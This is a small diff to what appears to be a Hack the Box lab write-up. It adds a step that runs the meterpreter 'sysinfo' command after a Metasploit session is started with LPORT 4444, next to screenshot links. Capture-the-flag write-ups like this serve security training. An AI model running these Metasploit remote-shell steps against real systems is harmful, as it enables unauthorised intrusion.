@@ -72,7 +72,11 @@ Nmap done: 1 IP address (1 host up) scanned in 15.37 seconds
 ▶ set LPORT 4444
 ▶ run
 ```
+  - View `sysinfo`.
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/c64fc822-539f-4fb3-9e1e-8e06a0500bfa)
+```CSS
+meterpreter> sysinfo
+```
 
 - Get a upgraded shell and view system information.
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/cd643c8f-22be-4c47-ae52-263d0ac6520d)
